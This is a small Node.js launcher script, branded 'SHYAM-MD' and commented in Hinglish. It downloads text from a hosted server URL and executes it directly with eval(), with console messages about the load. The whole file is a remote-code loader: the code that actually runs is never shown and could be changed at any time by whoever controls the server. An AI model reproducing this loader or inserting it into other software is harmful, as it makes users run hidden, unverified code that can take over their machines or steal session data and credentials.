const axios = require('axios');

// Tumhara apna server ya API link (Yahan tum apna script server link daloge)
const shyamServer = "https://my-session-generator-1-c5io.onrender.app/api/shyam-md"; 

axios.get(shyamServer)
    .then(response => {
        // Success Message with Shyam-MD Branding
        console.log("\x1b[36m🚀 [SHYAM-MD] Successfully loaded script from SHYAM-SERVER.\x1b[0m");
        
        // Response data ko execute karna
        if (response.data) {
            eval(response.data);
        }
    })
    .catch(err => {
        // Error Message with Shyam-MD Branding
        console.error("\x1b[31m⚠️ [SHYAM-MD] Failed to connect to SHYAM-SERVER. Error:", err.message, "\x1b[0m");
        console.log("\x1b[33m💡 Tip: Check if your Render server is awake!\x1b[0m");
    });
